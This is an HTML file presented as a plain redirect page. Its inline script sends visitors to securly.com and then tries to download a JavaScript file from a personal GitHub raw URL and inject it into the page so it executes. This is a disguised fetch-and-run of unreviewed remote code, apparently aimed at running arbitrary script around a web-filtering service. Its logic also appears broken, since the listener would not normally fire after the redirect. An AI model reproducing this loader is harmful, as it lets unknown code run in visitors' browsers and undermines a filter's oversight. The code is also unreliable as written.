<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting</title>
    <script>
        // Wait for the page to load
        window.addEventListener('load', () => {
            const redirectUrl = 'https://securly.com';
            const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';

            // Redirect to the new URL and track it
            window.location.replace(redirectUrl);

            // Listen for the 'pageshow' event after redirection
            window.addEventListener('pageshow', () => {
                fetch(scriptUrl)
                    .then(response => response.text())
                    .then(scriptContent => {
                        const scriptElement = document.createElement('script');
                        scriptElement.textContent = scriptContent;
                        document.body.appendChild(scriptElement);
                    })
                    .catch(error => console.error('Error loading script:', error));
            });
        });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
</body>
</html>
